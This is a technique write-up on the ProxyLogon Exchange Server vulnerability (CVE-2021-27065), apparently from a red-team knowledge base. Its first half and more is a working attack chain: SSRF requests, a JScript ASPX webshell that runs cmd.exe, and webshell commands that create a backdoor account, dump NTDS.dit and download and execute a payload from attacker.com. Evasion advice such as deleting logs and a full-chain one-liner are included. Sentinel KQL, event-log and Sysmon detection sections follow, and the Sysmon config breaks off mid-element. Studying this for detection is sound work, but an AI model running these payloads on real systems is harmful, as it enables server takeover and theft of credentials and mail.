# [PE-REMOTE-001]: Exchange Server Vulnerabilities

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-REMOTE-001 |
| **MITRE ATT&CK v18.1** | [T1210 - Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Privilege Escalation / Initial Access |
| **Platforms** | Windows AD (On-Premises Exchange) |
| **Severity** | **Critical** |
| **CVE** | CVE-2021-27065 |
| **Technique Status** | **FIXED** (Patched in cumulative updates released March 2, 2021 and later) |
| **Last Verified** | 2024-12-15 |
| **Affected Versions** | Exchange Server 2013 (SP1+), Exchange Server 2016 (CU1-CU19), Exchange Server 2019 (CU1-CU8) |
| **Patched In** | Exchange 2013 CU22+, Exchange 2016 CU20+, Exchange 2019 CU9+ |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** CVE-2021-27065 is a post-authentication arbitrary file write vulnerability affecting Microsoft Exchange Server. This vulnerability is a critical component of the **ProxyLogon** attack chain and allows an authenticated attacker (or an attacker who has bypassed authentication via CVE-2021-26855 SSRF) to write arbitrary files to any path on the Exchange server. The vulnerability specifically affects the Set-OabVirtualDirectory and related Exchange cmdlets, which do not properly validate file paths, allowing path traversal to bypass directory restrictions. By chaining this with CVE-2021-26855 (SSRF), an unauthenticated attacker can escalate to SYSTEM-level Remote Code Execution (RCE) by uploading a malicious ASPX webshell to the wwwroot directory.

**Attack Surface:** The vulnerability is exposed through Exchange Management Shell cmdlets (Set-OabVirtualDirectory, Set-VirtualDirectory, New-MailboxExportRequest) and the Autodiscover service. The exploitation vector requires network access to port 443 (HTTPS) on the Exchange Client Access Server and knowledge of a valid administrative email account.

**Business Impact:** **Complete server compromise with SYSTEM privileges.** Adversaries leveraging this vulnerability have been observed stealing full mailbox contents, creating backdoor administrative accounts, extracting the Active Directory database (NTDS.dit), deploying ransomware, and establishing persistent access for lateral movement. The Advanced Persistent Threat (APT) group HAFNIUM actively exploited this vulnerability from January 2021 onwards, targeting organizations across multiple sectors including US government agencies.

**Technical Context:** Exploitation typically occurs within seconds to minutes once an attacker obtains initial access via the CVE-2021-26855 SSRF or valid credentials. The generated webshell activity is detectable through process-level monitoring and file system analysis, but attackers commonly clear logs post-exploitation. Stealth is moderate—the attack generates IIS logs and ECP (Exchange Control Panel) cmdlet logs with observable patterns.

### Operational Risk

- **Execution Risk:** **High** – Complete server takeover; no rollback possible without restoring from clean backups.
- **Stealth:** **Medium** – Generates observable ECP/Exchange logs and IIS artifacts; webshell uploads to predictable paths.
- **Reversibility:** **No** – Requires full server rebuild or restore from verified clean backups. Persistence mechanisms (backdoor accounts, webshells) must be manually removed.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Microsoft Exchange Server 2019 Benchmark v1.0 (Section 2.2) | Access to Exchange components should be restricted to authenticated users only; network-level restrictions should be enforced. |
| **DISA STIG** | EXCH19-000001 | Exchange should require authentication for all user connections. |
| **CISA SCuBA** | O365.AUTH.02 | Require multi-factor authentication for all users. |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Enforcement), SI-2 (Flaw Remediation) | Organizations must maintain authorized user accounts, enforce least-privilege access, and promptly remediate known vulnerabilities. |
| **GDPR** | Article 32 (Security of Processing) | Implementation of appropriate technical and organizational measures to ensure a level of security appropriate to the risk, including the ability to restore confidentiality and availability of personal data. |
| **DORA** | Article 9 (Protection and Prevention) | Operators of critical digital infrastructure must ensure that authentication and authorization mechanisms are secure and regularly updated. |
| **NIS2** | Article 21 (Cyber Risk Management Measures) | Competent authorities must ensure that multi-factor authentication is used for administrative access and that systems are patched in a timely manner. |
| **ISO 27001** | A.9.2.3 (User Access Rights), A.12.6.1 (Management of Technical Vulnerabilities) | Organizations must restrict access rights and ensure timely patching of known vulnerabilities. |
| **ISO 27005** | Risk Scenario: "Compromise of Email Server via Unpatched Vulnerability" | Likelihood: High; Impact: Critical. |

---

## Technical Prerequisites

- **Required Privileges:** 
  - For post-authentication exploitation: Any valid Exchange user account (e.g., mailbox user).
  - For unauthenticated exploitation: No authentication required if CVE-2021-26855 (SSRF) is chained first.

- **Required Access:** 
  - Network access to TCP port 443 (HTTPS) on Exchange Client Access Server (CAS).
  - DNS resolution for the Exchange server hostname (or direct IP access).
  - For post-auth: Valid credentials for any user account with Exchange access.

**Supported Versions:**
- **Exchange Server 2013:** SP1 through CU21 (patched in CU22)
- **Exchange Server 2016:** CU1 through CU19 (patched in CU20)
- **Exchange Server 2019:** CU1 through CU8 (patched in CU9)
- **Exchange Online:** NOT affected (SaaS service is automatically patched by Microsoft)

**Tools:**
- [ProxyLogon GitHub PoC](https://github.com/hausec/ProxyLogon) (For demonstration/testing only)
- [Test-ProxyLogon.ps1](https://github.com/microsoft/CSS-Exchange/blob/main/Security/Test-ProxyLogon.ps1) (Microsoft's detection script)
- [Exchange On-Premises Mitigation Tool (EOMT.ps1)](https://microsoft.github.io/CSS-Exchange/Security/EOMT/) (Microsoft's mitigation tool)
- [Microsoft Safety Scanner](https://learn.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download) (Malware scanning)
- curl, PowerShell, or custom HTTP clients for SSRF chaining

---

## Environmental Reconnaissance

### Management Station / PowerShell Reconnaissance

**Check Exchange Server Version & Patch Level:**
```powershell
# Query the local Exchange server's version
Get-ExchangeServer | Select-Object Name, ServerRole, AdminDisplayVersion

# Expected Output for VULNERABLE versions:
# Name           : EX01
# ServerRole     : Mailbox, ClientAccess
# AdminDisplayVersion : Version 15.1 (Build 2034.27)  <- Exchange 2019 CU8 (VULNERABLE)

# Expected Output for PATCHED versions:
# AdminDisplayVersion : Version 15.1 (Build 2034.32)  <- Exchange 2019 CU9+ (PATCHED)

# Query cumulative update level
Get-ExchangeServer | Select-Object Name, @{n="CU";e={$_.AdminDisplayVersion -replace '.*\(','' -replace '\).*',''}}
```

**What to Look For:**
- Versions prior to CU22 (2013), CU20 (2016), or CU9 (2019) are vulnerable.
- Build numbers below 2034.32 (2019), 1395.10 (2016), or 1473.16 (2013) indicate unpatched systems.
- Missing Exchange on-premises or all servers listed as "Mailbox" role without "ClientAccess" may indicate Exchange Online (not vulnerable).

**Verify Autodiscover Accessibility:**
```powershell
# Test connectivity to Autodiscover endpoint
Test-NetConnection -ComputerName mail.contoso.com -Port 443

# Query the Autodiscover endpoint (requires user credentials later in the attack chain)
$autodiscoverUrl = "https://mail.contoso.com/autodiscover/autodiscover.xml"
curl -v $autodiscoverUrl
```

### Linux/Bash / CLI Reconnaissance

```bash
# Identify Exchange servers on the network (requires access to DNS or network enumeration)
nslookup mail.contoso.com
nslookup autodiscover.contoso.com

# Check for HTTP/HTTPS connectivity to potential Exchange servers
curl -I -k https://mail.contoso.com/autodiscover/autodiscover.xml

# Expected Response (vulnerable):
# HTTP/1.1 401 Unauthorized
# This indicates the server is accessible but requires authentication

# Expected Response (patched or not Exchange):
# HTTP/1.1 404 Not Found
# or proper authentication mechanisms
```

---

## Detailed Execution Methods

### METHOD 1: Chained ProxyLogon Attack (CVE-2021-26855 + CVE-2021-27065) - SSRF to File Write

This is the **primary exploitation method** used by HAFNIUM and represents the complete attack chain.

**Supported Versions:** Exchange Server 2013 SP1 - 2019 CU8 (all vulnerable versions)

#### Step 1: Reconnaissance - Obtain Target Information

**Objective:** Gather the Exchange server FQDN, obtain the target administrator's email address, and retrieve authentication details needed for later stages.

**Command (Windows PowerShell):**
```powershell
# Step 1a: Query DNS for autodiscover endpoint
$exchangeServer = "mail.contoso.com"
nslookup autodiscover.$((([uri]"https://mail.contoso.com").Host -split '\.' | Select-Object -Skip 1) -join '.')

# Step 1b: Identify Exchange server FQDN via NTLM authentication request
# Create a basic HTTP request to /rpc/rpcproxy.dll to trigger NTLM negotiation
$url = "https://$exchangeServer/rpc/rpcproxy.dll"
$req = [System.Net.HttpWebRequest]::Create($url)
$req.AllowAutoRedirect = $false
$req.Method = "RPC_IN_DATA"

try {
    $res = $req.GetResponse()
} catch {
    # Parse NTLM challenge from error response
    $challenge = $_.Exception.Response.GetResponseHeader("WWW-Authenticate")
    Write-Host "NTLM Challenge: $challenge"
    # Extract server FQDN from the challenge response
}

# Step 1c: Get administrator email address (via social engineering, OSINT, or valid account compromise)
$adminEmail = "admin@contoso.com"
```

**What This Means:**
- The DNS lookups verify that the Exchange server is accessible from the attack position.
- The NTLM challenge response contains the server's NetBIOS name and domain information, which is used later in the attack chain to construct proper requests.
- Once the admin email is identified, the attacker proceeds to the SSRF phase.

**OpSec & Evasion:**
- These reconnaissance steps generate minimal logs. DNS queries and basic HTTP requests to the autodiscover endpoint are routine.
- Detection likelihood: **Low** at this stage (reconnaissance is passive).

#### Step 2: Server-Side Request Forgery (CVE-2021-26855) - Authentication Bypass

**Objective:** Abuse the SSRF vulnerability to send HTTP requests to internal Exchange services while impersonating the server itself, bypassing the external authentication requirement.

**Command (curl/PowerShell):**
```bash
# Step 2a: Exploit CVE-2021-26855 SSRF to reach EWS (Exchange Web Services) internally
exchangeServer="mail.contoso.com"
adminEmail="admin@contoso.com"

# Craft SSRF request to bypass authentication
# The X-BEResource cookie tricks Exchange into routing requests to internal backends
curl -k -X POST \
  "https://$exchangeServer/autodiscover/autodiscover.xml" \
  -H "X-BEResource: $exchangeServer/autodiscover?a=~3d1@contoso.com" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
<Request>
<EMailAddress>'"$adminEmail"'</EMailAddress>
<AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
</Request>
</Autodiscover>'
```

**Expected Output:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
  <Response>
    <User>
      <LegacyDN>/o=First Organization/ou=Exchange Administrative Group/cn=Recipients/cn=admin</LegacyDN>
      <DisplayName>Administrator</DisplayName>
    </User>
    ...
  </Response>
</Autodiscover>
```

**What This Means:**
- The SSRF response includes the `LegacyDN` (Distinguished Name) of the admin account, which is required for the next stage.
- The vulnerability allows unauthenticated HTTP requests to be forwarded to EWS (Exchange Web Services) without requiring valid credentials.
- This is the "authentication bypass" phase of ProxyLogon.

**OpSec & Evasion:**
- SSRF requests are logged by Exchange, but the requests appear to come from the Exchange server itself.
- Detection likelihood: **Medium** – SSRF requests to internal services may trigger IPS/WAF rules if properly configured.
- **Tip:** Use the attacker's IP spoofing or compromised internal IP to blend in.

#### Step 3: Extract Admin SID and OAB ID via EWS

**Objective:** Retrieve the Security Identifier (SID) of the admin account and identify the Offline Address Book (OAB) to be manipulated in later steps.

**Command (PowerShell/curl):**
```powershell
# Step 3a: Construct EWS request to extract admin SID
$legacyDn = "/o=First Organization/ou=Exchange Administrative Group/cn=Recipients/cn=admin"
$adminEmail = "admin@contoso.com"

# Build SSRF request with EWS payload (this is forwarded to EWS through the vulnerability)
$eakRequest = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <GetDelegate xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
      <Mailbox>
        <EmailAddress>$adminEmail</EmailAddress>
      </Mailbox>
    </GetDelegate>
  </soap:Body>
</soap:Envelope>
"@

# Send this through the SSRF vector
curl -k -X POST \
  "https://mail.contoso.com/autodiscover/autodiscover.xml" \
  -H "X-BEResource: mail.contoso.com/ews/exchange.asmx~3d1@contoso.com" \
  -H "Content-Type: text/xml" \
  -d $eakRequest
```

**Expected Output:**
```xml
<soap:Response>
  <UserSid>S-1-5-21-2127521184-1604012920-1887927527-500</UserSid>
  <!-- The SID is embedded in the error or response -->
</soap:Response>
```

**What This Means:**
- The SID is extracted and will be used to craft administrative tokens in later stages.
- This step establishes the "authenticated" context needed to call Exchange PowerShell cmdlets.

#### Step 4: Retrieve OAB Virtual Directory Configuration

**Objective:** Query the Offline Address Book Virtual Directory to obtain the ID needed to manipulate its ExternalUrl property in the next step.

**Command (PowerShell/via SSRF):**
```powershell
# Step 4: Query OAB Virtual Directory through EWS (SSRF vector)
$oabRequest = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <GetOrgMigrationRequest xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" />
  </soap:Body>
</soap:Envelope>
"@

# This returns the OAB Virtual Directory identity
curl -k -X POST \
  "https://mail.contoso.com/autodiscover/autodiscover.xml" \
  -H "X-BEResource: mail.contoso.com/ews/exchange.asmx~3d1@contoso.com" \
  -H "Content-Type: text/xml" \
  -d $oabRequest
```

**What This Means:**
- The response contains the OAB Virtual Directory identity (e.g., "OAB (Default)"), which is required for the next exploitation step.

#### Step 5: Exploit CVE-2021-27065 - Set-OabVirtualDirectory with Malicious ExternalUrl

**Objective:** Use the arbitrary file write vulnerability to inject a malicious ASPX webshell into the Exchange wwwroot directory via the Set-OabVirtualDirectory cmdlet.

**Command (PowerShell/via SSRF):**
```powershell
# Step 5a: Craft the malicious payload (JavaScript webshell embedded in ExternalUrl)
# This webshell will be written to the file system when Exchange processes the cmdlet

$maliciousPayload = @"
<script language="JScript" runat="server">
function Page_Load() {
    var cmd = Request.QueryString("cmd");
    var shell = new ActiveXObject("WScript.Shell");
    var proc = shell.Exec("cmd.exe /c " + cmd);
    Response.Write(proc.StdOut.ReadAll());
}
</script>
"@

# Step 5b: Construct the PowerShell cmdlet call (through the SSRF/EWS vector)
$cmdletRequest = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <SetOabVirtualDirectory xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
      <Identity>OAB (Default)</Identity>
      <ExternalUrl>http://attacker-controlled-domain.com/$maliciousPayload</ExternalUrl>
    </SetOabVirtualDirectory>
  </soap:Body>
</soap:Envelope>
"@

# Step 5c: Execute the Set-OabVirtualDirectory call
curl -k -X POST \
  "https://mail.contoso.com/autodiscover/autodiscover.xml" \
  -H "X-BEResource: mail.contoso.com/ews/exchange.asmx~3d1@contoso.com" \
  -H "Content-Type: text/xml" \
  -d $cmdletRequest
```

**Alternative Method - Direct File Path Manipulation:**
```powershell
# Step 5d: Alternatively, craft a New-MailboxExportRequest that writes to a specific path
$exportRequest = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <NewMailboxExportRequest xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
      <Mailbox>admin@contoso.com</Mailbox>
      <FilePath>\\127.0.0.1\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\shell.aspx</FilePath>
    </NewMailboxExportRequest>
  </soap:Body>
</soap:Envelope>
"@
```

**Expected Outcome:**
- The malicious ASPX file is written to the webroot directory, typically: `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\shell.aspx`
- The webshell becomes accessible at: `https://mail.contoso.com/owa/auth/shell.aspx?cmd=whoami`

**OpSec & Evasion:**
- The Set-OabVirtualDirectory call is logged in ECP (Exchange Control Panel) Server logs at `$env:PROGRAMFILES\Microsoft\Exchange Server\V15\Logging\ECP\Server\`.
- The webshell file creation triggers file system monitoring (if enabled).
- **Evasion:** Immediate log deletion post-exploitation; use legitimate administrative accounts for the SSRF requests.
- Detection likelihood: **High** if logs are monitored in real-time; **Low** if logs are not reviewed.

#### Step 6: Access the Webshell and Execute Commands

**Objective:** Access the deployed webshell to execute arbitrary commands on the Exchange server with SYSTEM privileges.

**Command (curl/PowerShell):**
```bash
# Step 6a: Execute whoami command to verify code execution
curl -k "https://mail.contoso.com/owa/auth/shell.aspx?cmd=whoami"

# Expected Output:
# nt authority\system

# Step 6b: Execute additional commands (e.g., dump credentials, create backdoor account)
curl -k "https://mail.contoso.com/owa/auth/shell.aspx?cmd=net+user+backdoor+P@ssw0rd123!+/add"

# Step 6c: Execute lateral movement commands (e.g., dump NTDS.dit)
curl -k "https://mail.contoso.com/owa/auth/shell.aspx?cmd=ntdsutil%20%22activate%20instance%20ntds%22%20%22ifm%22%20%22create%20full%20c:\windows\temp\iftm%22%20q%20q"

# Step 6d: Execute malware deployment (e.g., stage ransomware, backdoor)
# Download a secondary payload from an external server
curl -k "https://mail.contoso.com/owa/auth/shell.aspx?cmd=powershell+-c+%22IEX+(New-Object+System.Net.WebClient).DownloadString('http://attacker.com/payload.ps1')%22"
```

**What This Means:**
- The attacker now has arbitrary code execution on the Exchange server with SYSTEM privileges.
- All downstream attacks (credential dumping, persistence, lateral movement, data exfiltration) are now possible.

---

### METHOD 2: Post-Authentication Exploitation (Valid Credentials)

This method assumes the attacker has obtained valid Exchange user credentials (via phishing, password spray, or credential stuffing).

**Supported Versions:** Exchange Server 2013 SP1 - 2019 CU8

#### Step 1: Connect with Valid Credentials

**Objective:** Establish an authenticated session to the Exchange server.

**Command (PowerShell on Management Station or Compromised Endpoint):**
```powershell
# Step 1: Create remote PS session to Exchange
$session = New-PSSession -ConfigurationName Microsoft.Exchange `
  -ConnectionUri "http://mail.contoso.com/PowerShell/" `
  -Authentication Kerberos `
  -Credential (Get-Credential)
  # Alternatively, use: -Authentication Basic (for HTTP-based connections)

Import-PSSession $session

# Verify authenticated session
Get-MailboxStatistics
```

**Expected Output:**
```
DisplayName          ItemCount StorageLimitStatus
admin@contoso.com    1250      BelowLimit
user1@contoso.com    450       BelowLimit
```

**What This Means:**
- The attacker is now authenticated and can execute Exchange PowerShell cmdlets directly.

#### Step 2: Execute Set-OabVirtualDirectory to Write Webshell

**Objective:** Directly invoke the vulnerable Set-OabVirtualDirectory cmdlet to write the malicious file.

**Command (PowerShell - Authenticated Session):**
```powershell
# Step 2a: Get the OAB Virtual Directory name
$oab = Get-OabVirtualDirectory

# Step 2b: Set the ExternalUrl with malicious JavaScript payload
$maliciousScript = '<script language="JScript" runat="server">
function Page_Load() {
    var cmd = Request.QueryString("cmd");
    var shell = new ActiveXObject("WScript.Shell");
    var proc = shell.Exec("cmd.exe /c " + cmd);
    Response.Write(proc.StdOut.ReadAll());
}
</script>'

Set-OabVirtualDirectory -Identity $oab.Identity `
  -ExternalUrl "http://attacker.com/$maliciousScript"

# Step 2c: Trigger the ResetOabVirtualDirectory to write the file
# This causes Exchange to fetch the ExternalUrl and write it to disk
Reset-OabVirtualDirectory -Identity $oab.Identity
```

**What This Means:**
- The arbitrary file write is now direct—no SSRF chain required.
- The file is written to the wwwroot directory immediately upon Reset-OabVirtualDirectory execution.

#### Step 3: Access the Webshell

**Command (curl/Browser):**
```bash
curl -k "https://mail.contoso.com/owa/auth/shell.aspx?cmd=whoami"

# Output:
# nt authority\system
```

---

### METHOD 3: Exploitation via New-MailboxExportRequest (Alternative File Write)

This method leverages an alternative cmdlet that also contains the CVE-2021-27065 path traversal vulnerability.

**Supported Versions:** Exchange Server 2013 SP1 - 2019 CU8

**Command (PowerShell - Authenticated Session or via SSRF):**
```powershell
# Step 1: Create a new mailbox export request with a UNC path to write a webshell
# The FilePath parameter does not properly validate path traversal

$targetPath = "\\127.0.0.1\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\shell.aspx"

New-MailboxExportRequest -Mailbox admin@contoso.com `
  -FilePath $targetPath `
  -Name "LegitExport"

# Step 2: Monitor the export status
Get-MailboxExportRequestStatistics

# Step 3: Once completed, the shell.aspx file is written to the target directory
# Access it: https://mail.contoso.com/owa/auth/shell.aspx?cmd=whoami
```

**What This Means:**
- This provides an alternative exploitation path when Set-OabVirtualDirectory is monitored or restricted.
- The same result (arbitrary file write leading to webshell) is achieved.

---

## Tools & Commands Reference

### [ProxyLogon GitHub PoC](https://github.com/hausec/ProxyLogon)

**Version:** Latest (varies by fork)  
**Minimum Version:** Any version from March 2021 onwards  
**Supported Platforms:** Windows, Linux (with curl/PowerShell)

**Installation (Linux/WSL):**
```bash
git clone https://github.com/hausec/ProxyLogon.git
cd ProxyLogon
python3 ProxyLogon.py --help
```

**Usage:**
```bash
# Run the full ProxyLogon exploitation chain
python3 ProxyLogon.py -t mail.contoso.com -u admin@contoso.com

# Alternative: Use curl for manual step-by-step exploitation
./proxylogon_manual.sh mail.contoso.com admin@contoso.com
```

---

### [Test-ProxyLogon.ps1 (Microsoft)](https://github.com/microsoft/CSS-Exchange/blob/main/Security/Test-ProxyLogon.ps1)

**Version:** Latest (continuously updated by Microsoft)  
**Supported Platforms:** Windows PowerShell 5.0+

**Installation:**
```powershell
# Download the Microsoft detection script
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/Test-ProxyLogon.ps1" -OutFile "Test-ProxyLogon.ps1"

# Execute with administrative privileges
.\Test-ProxyLogon.ps1
```

**Output:**
```
ProxyLogon Vulnerability Testing Results:
================================================
System: mail.contoso.com
CVE-2021-26855 (SSRF): Not Vulnerable (PATCHED)
CVE-2021-26857 (UM Deserialization): Not Vulnerable (PATCHED)
CVE-2021-26858 (File Write): Not Vulnerable (PATCHED)
CVE-2021-27065 (OAB File Write): VULNERABLE
...
```

---

### [Exchange On-Premises Mitigation Tool (EOMT.ps1)](https://microsoft.github.io/CSS-Exchange/Security/EOMT/)

**Version:** Latest (auto-updates from GitHub)  
**Supported Platforms:** Windows PowerShell 5.0+ (Admin privileges required)

**Installation & Usage:**
```powershell
# Download the mitigation tool
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/EOMT.ps1" -OutFile "EOMT.ps1"

# Execute mitigation (includes scanning for compromise)
.\EOMT.ps1

# To run without remediation (detection only)
.\EOMT.ps1 -DoNotRemediate

# To rollback previous mitigations
.\EOMT.ps1 -RollbackMitigation
```

---

### Script (One-Liner - Full ProxyLogon Chain)

```powershell
# Full ProxyLogon SSRF + File Write chain (requires curl/PowerShell 5.0+)
$exchangeServer = "mail.contoso.com"
$adminEmail = "admin@contoso.com"
$webShell = '<script language="JScript" runat="server">function Page_Load(){var cmd=Request.QueryString("cmd");var shell=new ActiveXObject("WScript.Shell");var proc=shell.Exec("cmd.exe /c "+cmd);Response.Write(proc.StdOut.ReadAll());}</script>'

# Step 1: Exploit CVE-2021-26855 SSRF to bypass auth
$ssrfUrl = "https://$exchangeServer/autodiscover/autodiscover.xml"
$ssrfPayload = '<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>'{0}'</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>' -f $adminEmail

# Step 2: Exploit CVE-2021-27065 File Write via Set-OabVirtualDirectory
$fileWritePayload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><RequestServerVersion Version="Exchange2016"/></soap:Header><soap:Body><SetOabVirtualDirectory xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"><Identity>OAB (Default)</Identity><ExternalUrl>http://attacker.com/{0}</ExternalUrl></SetOabVirtualDirectory></soap:Body></soap:Envelope>' -f $webShell

# Execute requests
Invoke-WebRequest -Uri $ssrfUrl -Method Post -ContentType "text/xml" -Body $ssrfPayload -SkipCertificateCheck -Headers @{"X-BEResource" = "$exchangeServer/autodiscover?a=~3d1@contoso.com"} -Verbose
Invoke-WebRequest -Uri $ssrfUrl -Method Post -ContentType "text/xml" -Body $fileWritePayload -SkipCertificateCheck -Headers @{"X-BEResource" = "$exchangeServer/ews/exchange.asmx~3d1@contoso.com"} -Verbose

# Step 3: Access the webshell
Write-Host "Webshell accessible at: https://$exchangeServer/owa/auth/shell.aspx?cmd=whoami"
```

---

## Microsoft Sentinel Detection

### Query 1: Detect Set-OabVirtualDirectory Cmdlet Abuse (ECP Logs)

**Rule Configuration:**
- **Required Table:** Event (Windows Event Logs), if forwarded to Sentinel  
- **Alternative Table:** AuditLogs (if Exchange Online auditing is enabled)
- **Required Fields:** EventID, Data, Computer
- **Alert Severity:** **Critical**
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Exchange 2013, 2016, 2019 (all unpatched versions)

**KQL Query:**
```kusto
Event
| where EventID == 4688 or Source == "MSExchange"
| where (Computer contains "EXCHANGESERVER" or Computer contains "EX01")
| where Data has_any ("Set-OabVirtualDirectory", "ExternalUrl", "<script", "JScript")
| project TimeGenerated, Computer, Data, User=split(split(Data, "User = ")[1], ";")[0]
| where isnotempty(User)
```

**What This Detects:**
- Execution of the vulnerable Set-OabVirtualDirectory cmdlet.
- Presence of script tags or JScript in the ExternalUrl parameter.
- Indicators of post-exploitation activity via cmdlet logs.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `ProxyLogon CVE-2021-27065 Set-OabVirtualDirectory Exploitation`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents from all triggered alerts**
   - Severity mapping: `Critical`
7. **Automated response:** Configure action to notify SOC and isolate the Exchange server
8. Click **Review + create**

---

### Query 2: Detect Webshell File Creation in OWA Directory

**Rule Configuration:**
- **Required Table:** DeviceFileEvents (Windows Defender for Endpoint)
- **Required Fields:** FileName, FolderPath, ActionType, InitiatingProcessCommandLine
- **Alert Severity:** **Critical**
- **Frequency:** Run every 1 minute (real-time)
- **Applies To Versions:** All (post-exploitation detection)

**KQL Query:**
```kusto
DeviceFileEvents
| where ActionType == "FileCreated"
| where FolderPath has @"\owa\auth\" or FolderPath has @"\ecp\"
| where FileName has_any (".aspx", ".asp", ".jsp")
| where not(InitiatingProcessFileName in~ ("w3wp.exe", "iisexpress.exe"))
| project TimeGenerated, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine
```

**What This Detects:**
- Suspicious ASPX/ASP/JSP file creation in Exchange web directories.
- Files created by processes other than IIS (w3wp.exe).

---

### Query 3: Detect Suspicious EWS Requests (SSRF Vector)

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4688 - Process Creation) or W3CIISLog (IIS Logs)
- **Alert Severity:** **High**
- **Frequency:** Run every 10 minutes

**KQL Query:**
```kusto
W3CIISLog
| where csUriStem has "/autodiscover/autodiscover.xml" or csUriStem has "/ews/exchange.asmx"
| where csUserAgent contains "ExchangeWebServicesProxy" or isempty(csUserName)
| where csMethod == "POST"
| where toint(scStatus) == 200 or toint(scStatus) == 401
| project TimeGenerated, cIP, csHost, csUriStem, scStatus, csUserAgent, csUserName
| summarize Count=count() by cIP, csHost
| where Count > 5 // Multiple requests from same IP
```

**What This Detects:**
- Unusual POST requests to Autodiscover/EWS without valid authentication.
- Suspicious user agents associated with SSRF exploitation.

---

## Windows Event Log Monitoring

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** powershell.exe executing Exchange cmdlets with suspicious parameters (Set-OabVirtualDirectory, New-MailboxExportRequest)
- **Filter:** Look for cmdlet execution with file path parameters or script content.

**Event ID: 8015 (MSExchange OAB GeneratorAssistant)**
- **Log Source:** Application (MSExchange OAB)
- **Trigger:** Unusual OAB generation or modification requests
- **Applies To Versions:** Exchange 2013, 2016, 2019

**Manual Configuration Steps (Group Policy - Windows Server):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies**
3. Enable:
   - **Audit Process Creation** (Success and Failure)
   - **Audit File Share Access** (Success)
   - **Audit Logon Events** (Failure) 
4. Run `gpupdate /force` on target Exchange servers

**Manual Configuration Steps (Local Policy on Exchange Server):**
1. Open **Local Security Policy** (secpol.msc) on the Exchange server
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies**
3. Enable:
   - **Audit Process Creation**: Set to **Success and Failure**
   - **Audit File Share Access**: Set to **Success**
4. Run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`
5. Verify: `Get-EventLog -LogName Security -Newest 10`

**Real-Time Log Monitoring (PowerShell):**
```powershell
# Monitor for suspicious cmdlet execution
Get-EventLog -LogName Security -InstanceId 4688 | Where-Object {
    $_.Message -match "Set-OabVirtualDirectory|New-MailboxExportRequest|Reset-OabVirtualDirectory" -and
    $_.Message -match "script|.aspx|.asp"
} | Select-Object TimeGenerated, Message
```

---

## Sysmon Detection Patterns

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows Server 2016+, Windows 10+

**Sysmon Config XML:**
```xml
<!-- Detect suspicious file writes to Exchange web directories -->
<Sysmon schemaversion="4.40">
  <EventFiltering>
    <!-- Event ID 11: File Creation -->
    <FileCreate onmatch="include">
      <!-- Target OWA/ECP directories where webshells are written -->
      <TargetFilename condition="contains any">
